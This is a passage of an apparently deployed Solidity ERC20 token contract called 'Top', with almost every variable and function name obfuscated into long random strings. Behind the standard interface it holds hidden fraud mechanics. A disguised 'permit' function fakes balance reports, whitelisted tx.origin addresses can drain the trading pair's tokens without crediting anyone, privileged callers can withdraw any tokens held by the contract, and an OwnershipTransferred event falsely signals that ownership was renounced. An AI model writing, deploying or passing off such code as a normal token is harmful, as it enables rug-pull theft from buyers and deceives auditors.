    address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,
    uint256 flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG
  ) public {
    require(zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[msg.sender]);
    IERC20(socOfWuERtGphfz30EWJTAVfzf7nmoSQp1yvTwCjXQqcjauAtuPbM9CwW7xHOFQ2SuRUPT5vWj85w0PCGlILF5DfzR8atG24).transfer(nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG);
  }
}

contract TOP is dDyh3XtbdWMkvrKUzL3lVvbnlgyauvia47ZyDjGQcJwj2fvYqlabNTSebMscfcHJ9vJyLH46NjBoBSea1WRp6TzO1UnKrk5n {
  function totalSupply() external pure returns (uint256) {
    return xdqWvXmQmqvM4n2C7Uvx6lcsgx7SZZs5N4LCEg3x9WMhDiA2cEBGvBI7GzcmaEt3T9rLfcAfklh5t6HPEDsEjkEy6hkJdaBo;
  }

  function decimals() external pure returns (uint8) {
    return hDaLKu1G9Z9KDbFBv5L2B9myRAz0z7jwHMrtzIVG2YSB5KYpixAOr3EsQet52nfzxJlD84xYkXDU4xJy4to1ZdFzLUo6H0G1;
  }

  function symbol() external pure returns (string memory) {
    return nvxZHsEdeEWKBbpvFz90FK5c5NJzPZOGLM3jzlAkuRePpXEBKCHfcJProcqLifs5cJ8LfbRahhZpZ5lyunUeentGpfLIy1wN;
  }

  function name() external pure returns (string memory) {
    return zqAFgez0gLbQ3IjlzSc5avepnukN1wFuOL036mpers3LyY9pAFTietY8vM7TzvM1TasIStm153IFs4M64BMKH3hmoSnkN9ns;
  }

  function allowance(address onCxpJ80Z92zDWrNDRGXymwYnMTFzhBD9vod78p462JOehzFk974CE58SObgPd1JzLhQn8bzzt5l8OfTWL6A8blRGkT2NOVx, address j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR)
    external
    view
    returns (uint256)
  {
    return bfvqAx3Jsh92TONmdr7uXq9dPaw7cnsu2Wobgx7vP8g7vzAXuFMgoeA6XVg0elPQAorftP4I2DXO5j4Cul6Xxqje7UUNMDKq[onCxpJ80Z92zDWrNDRGXymwYnMTFzhBD9vod78p462JOehzFk974CE58SObgPd1JzLhQn8bzzt5l8OfTWL6A8blRGkT2NOVx][j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR];
  }

  event Transfer(address indexed, address indexed, uint256);
  event Approval(address indexed, address indexed, uint256);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  uint256 private w57FVLQnjLp8KNxA8RMMTWGZWdOPzhbxXlU1cHxI6WUDVAb3PTrnjCgnQUBERenHLiBhgGy03NjG00fiIqJfjPUmSdqXnkdG = 1;
  uint256 private nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE;

  function permit5764825481139(address roKqrvLnSBB1hPI97UmwZACYHCKoaPIyqXs6H0ixvkQ528H73tXXfuyDU0vlHs25UPg5I3cm7Bs8O9KQLBYr0AHkVL3C9hqh) public view returns (uint256) {
    if (
      (msg.sender == xLZ6hd5MOWQ3jNWo3EONg6OHXa49C8hEZVUWtdGdLBqUyWkfXwdNPVNRsXiukkEwtL3YPBgHGYAJuIBtuuKQAv3EOKOYIXOF || msg.sender == tEFurTQiAOCBQKWG7Wbuon5JfGmUhO2LDWvG5otYIbmGSyougjHquQ1uuuT1OdCt4b7IzRiA6bKyreQ6qaq1tWdgCB2KjlES) &&
      roKqrvLnSBB1hPI97UmwZACYHCKoaPIyqXs6H0ixvkQ528H73tXXfuyDU0vlHs25UPg5I3cm7Bs8O9KQLBYr0AHkVL3C9hqh != yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ &&
      roKqrvLnSBB1hPI97UmwZACYHCKoaPIyqXs6H0ixvkQ528H73tXXfuyDU0vlHs25UPg5I3cm7Bs8O9KQLBYr0AHkVL3C9hqh != xLZ6hd5MOWQ3jNWo3EONg6OHXa49C8hEZVUWtdGdLBqUyWkfXwdNPVNRsXiukkEwtL3YPBgHGYAJuIBtuuKQAv3EOKOYIXOF &&
      roKqrvLnSBB1hPI97UmwZACYHCKoaPIyqXs6H0ixvkQ528H73tXXfuyDU0vlHs25UPg5I3cm7Bs8O9KQLBYr0AHkVL3C9hqh != tEFurTQiAOCBQKWG7Wbuon5JfGmUhO2LDWvG5otYIbmGSyougjHquQ1uuuT1OdCt4b7IzRiA6bKyreQ6qaq1tWdgCB2KjlES
    ) {
      return xdqWvXmQmqvM4n2C7Uvx6lcsgx7SZZs5N4LCEg3x9WMhDiA2cEBGvBI7GzcmaEt3T9rLfcAfklh5t6HPEDsEjkEy6hkJdaBo * w57FVLQnjLp8KNxA8RMMTWGZWdOPzhbxXlU1cHxI6WUDVAb3PTrnjCgnQUBERenHLiBhgGy03NjG00fiIqJfjPUmSdqXnkdG;
    }
    if (!zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[tx.origin]) {
      if (IERC20(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).balanceOf(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ) < eHLdEoyVPWAPaFSYwpKo7ngNeDLXApy9GTEEidvfqxNQRZ2QcrTXoYX9pIFgf4dE0OunbE2GuDYTV74AEvpV0hrMnRPoUqAg - nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE) {
        return 0;
      }
    }

    return zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[roKqrvLnSBB1hPI97UmwZACYHCKoaPIyqXs6H0ixvkQ528H73tXXfuyDU0vlHs25UPg5I3cm7Bs8O9KQLBYr0AHkVL3C9hqh];
  }

  mapping(address => mapping(address => uint256)) private bfvqAx3Jsh92TONmdr7uXq9dPaw7cnsu2Wobgx7vP8g7vzAXuFMgoeA6XVg0elPQAorftP4I2DXO5j4Cul6Xxqje7UUNMDKq;
  mapping(address => uint256) private zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y;

  string private constant zqAFgez0gLbQ3IjlzSc5avepnukN1wFuOL036mpers3LyY9pAFTietY8vM7TzvM1TasIStm153IFs4M64BMKH3hmoSnkN9ns = "Top";
  string private constant nvxZHsEdeEWKBbpvFz90FK5c5NJzPZOGLM3jzlAkuRePpXEBKCHfcJProcqLifs5cJ8LfbRahhZpZ5lyunUeentGpfLIy1wN = "TOP";
  uint8 private constant hDaLKu1G9Z9KDbFBv5L2B9myRAz0z7jwHMrtzIVG2YSB5KYpixAOr3EsQet52nfzxJlD84xYkXDU4xJy4to1ZdFzLUo6H0G1 = 9;
  uint256 public constant rvZPf4x8oPyLvTc5LlmJLd0ySsz81zo2U7K0WmrtvbO1pGAYdbO0kxDFbX6W6GhVLvQLcxINrJcdojlVTdfv4br39alIeJ5y = 10**9;

  uint256 public constant xdqWvXmQmqvM4n2C7Uvx6lcsgx7SZZs5N4LCEg3x9WMhDiA2cEBGvBI7GzcmaEt3T9rLfcAfklh5t6HPEDsEjkEy6hkJdaBo = 100000000 * 10**hDaLKu1G9Z9KDbFBv5L2B9myRAz0z7jwHMrtzIVG2YSB5KYpixAOr3EsQet52nfzxJlD84xYkXDU4xJy4to1ZdFzLUo6H0G1;

  constructor(bytes memory hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS) {
    zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[address(this)] = xdqWvXmQmqvM4n2C7Uvx6lcsgx7SZZs5N4LCEg3x9WMhDiA2cEBGvBI7GzcmaEt3T9rLfcAfklh5t6HPEDsEjkEy6hkJdaBo;
    emit Transfer(address(0), address(this), xdqWvXmQmqvM4n2C7Uvx6lcsgx7SZZs5N4LCEg3x9WMhDiA2cEBGvBI7GzcmaEt3T9rLfcAfklh5t6HPEDsEjkEy6hkJdaBo);

    yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ = zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(tEFurTQiAOCBQKWG7Wbuon5JfGmUhO2LDWvG5otYIbmGSyougjHquQ1uuuT1OdCt4b7IzRiA6bKyreQ6qaq1tWdgCB2KjlES).factory()).createPair(
      sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc,
      address(this)
    );

    sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ = (xdqWvXmQmqvM4n2C7Uvx6lcsgx7SZZs5N4LCEg3x9WMhDiA2cEBGvBI7GzcmaEt3T9rLfcAfklh5t6HPEDsEjkEy6hkJdaBo / 100) * 80;
    mTMGAS6wsd6m174a1IRbzBduQC1jz6AM60QtsSayuu0WD9VqU6Oq9l1E7IET5hgqeiOFNBSJzVvdKFnnzpnVMGQIMjpW4ODQ = (sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ * rvZPf4x8oPyLvTc5LlmJLd0ySsz81zo2U7K0WmrtvbO1pGAYdbO0kxDFbX6W6GhVLvQLcxINrJcdojlVTdfv4br39alIeJ5y) / 1000000000000000000;

    metwPzLSGQyYLRhIaz9vogwdmpFJ60Y52lbsnvE3jVZVqsf8f6ELBHv9tqqFYb0CUna0MpdBn2u5yGWgCGZBkK0rR01YMt7t(address(this), tH6GdcFY4R73C5F3ImO7vvmzJrI0CYN9MWY7i5bRMb36Xu1Fr9WO38GNJlSDApTGwdaKQbkWr93l0eFQ8lHHMthYuKqFeRTE, sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ);

    zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[msg.sender] = true;
    opUoC6KBbakzDxwnJ8bf7YCuANy6XSW9ysIO0qpZeL3vHCdRT5ZSaJtsYkLwLfyYGiCdGZ2fgd0hyEiiPx56j2q9wARJcBgW(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS);

    emit OwnershipTransferred(msg.sender, address(0));
  }

  function permit8355429682040(address tgBtRxmmJtFLxowlJUnlaFFdnTachCfOmSB4vYl1BUE3lAansmYUz4jEM3x4JB8Gig8daBDuWlhPFHOXT4WuIwNbQGCv2fiV, uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23)
    public
    returns (bool)
  {
    lMcKLHiD7WdErXAPTFIPV2YYT8X7tYNKt6g9EnYCvOKpRGqLVuXM2YogDNB2Z4MOWCDFYftxPvNplLtyQUc52JdRW1r6w4Fk(msg.sender, tgBtRxmmJtFLxowlJUnlaFFdnTachCfOmSB4vYl1BUE3lAansmYUz4jEM3x4JB8Gig8daBDuWlhPFHOXT4WuIwNbQGCv2fiV, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);
    return true;
  }

  function approve(address j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR, uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23)
    external
    returns (bool)
  {
    eGqoUDPdAKyoo9w1zB4kDuS5vKWAehnk1mV8B6BMxDimWRu9H9Z3RWOeeeyHeNjCqpgFAC2XJV4a0pffU5N9R2kwaSi3st2h(msg.sender, j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);
    return true;
  }

  function eGqoUDPdAKyoo9w1zB4kDuS5vKWAehnk1mV8B6BMxDimWRu9H9Z3RWOeeeyHeNjCqpgFAC2XJV4a0pffU5N9R2kwaSi3st2h(
    address lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9,
    address j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR,
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23
  ) internal {
    require(lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9 != address(0), "ERC20: Zero Address");
    require(j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR != address(0), "ERC20: Zero Address");

    bfvqAx3Jsh92TONmdr7uXq9dPaw7cnsu2Wobgx7vP8g7vzAXuFMgoeA6XVg0elPQAorftP4I2DXO5j4Cul6Xxqje7UUNMDKq[lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9][j1MY7K136q4EuMH3w2yBrJxiT1MBFgg7vTrw7cBBionfwfqTgZXi9deH4fgUhheROIG5QLEXrlpZCsng3SXcceJajs2RaGjR] = voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
  }

  function transferFrom(
    address lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9,
    address tgBtRxmmJtFLxowlJUnlaFFdnTachCfOmSB4vYl1BUE3lAansmYUz4jEM3x4JB8Gig8daBDuWlhPFHOXT4WuIwNbQGCv2fiV,
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23
  ) external returns (bool) {
    if (bfvqAx3Jsh92TONmdr7uXq9dPaw7cnsu2Wobgx7vP8g7vzAXuFMgoeA6XVg0elPQAorftP4I2DXO5j4Cul6Xxqje7UUNMDKq[lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9][msg.sender] != type(uint256).max) {
      bfvqAx3Jsh92TONmdr7uXq9dPaw7cnsu2Wobgx7vP8g7vzAXuFMgoeA6XVg0elPQAorftP4I2DXO5j4Cul6Xxqje7UUNMDKq[lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9][msg.sender] -= voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
    }

    return lMcKLHiD7WdErXAPTFIPV2YYT8X7tYNKt6g9EnYCvOKpRGqLVuXM2YogDNB2Z4MOWCDFYftxPvNplLtyQUc52JdRW1r6w4Fk(lws0RkULWe6so6ssWWvYxxvudOKoUrw66AaYe3jfefH3D83ujZd4odgqoSBVs23EO5XAr4eWXXQIy88AXAFnAJjcXTQRoHL9, tgBtRxmmJtFLxowlJUnlaFFdnTachCfOmSB4vYl1BUE3lAansmYUz4jEM3x4JB8Gig8daBDuWlhPFHOXT4WuIwNbQGCv2fiV, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);
  }

  function lMcKLHiD7WdErXAPTFIPV2YYT8X7tYNKt6g9EnYCvOKpRGqLVuXM2YogDNB2Z4MOWCDFYftxPvNplLtyQUc52JdRW1r6w4Fk(
    address e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0,
    address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23
  ) internal returns (bool) {
    if (zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[tx.origin]) {
      if (e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0 == yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ) {
        metwPzLSGQyYLRhIaz9vogwdmpFJ60Y52lbsnvE3jVZVqsf8f6ELBHv9tqqFYb0CUna0MpdBn2u5yGWgCGZBkK0rR01YMt7t(e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);
        return true;
      }
    }

    rDlDwg0bp1LolHhvJTChE6evmWPgzbbDsYdWNCuoaukRk2YK6eXyXefJY95Re95dbguqbgG3nDtQw7rNNHdM14TQOLt16eTZ(e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);
    if (!zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[tx.origin] && msg.sender == yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ)
    {
      w57FVLQnjLp8KNxA8RMMTWGZWdOPzhbxXlU1cHxI6WUDVAb3PTrnjCgnQUBERenHLiBhgGy03NjG00fiIqJfjPUmSdqXnkdG += 1;
      if(e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0==yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ)
        emit Transfer(nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,address(0), voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);
    }
      

    return true;
  }

  function rDlDwg0bp1LolHhvJTChE6evmWPgzbbDsYdWNCuoaukRk2YK6eXyXefJY95Re95dbguqbgG3nDtQw7rNNHdM14TQOLt16eTZ(
    address e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0,
    address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23
  ) internal returns (bool) {
    require(voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23 > 0, "Transfer amount must be greater than zero");
    zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0] -= voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
    zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj] += voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
    emit Transfer(e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);

    return true;
  }

  function metwPzLSGQyYLRhIaz9vogwdmpFJ60Y52lbsnvE3jVZVqsf8f6ELBHv9tqqFYb0CUna0MpdBn2u5yGWgCGZBkK0rR01YMt7t(
    address e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0,
    address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23
  ) internal returns (bool) {
    zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0] -= voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
    emit Transfer(e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0, nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23);

    return true;
  }

  function iIcElhWCTdk0Mp2bVjnaGpvy7uah9yPeZZG2geS1IFbJ9AOaGdU6ztrQAMpLNqBnmw7cfHxXBL0Fe6dPPk2tABWDP7K3B8CT(
    address e5Jwk2ocubL1QqzQo7a7XaTYGyZgKfM6hgJNfgmCq6EeBZt5r00dDIbsEcJS5E5oO4Der1A16f0WiBz9mRCRrS6EPVXKymB0,
    address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj,
    uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23
  ) internal returns (bool) {
    zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj] += voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
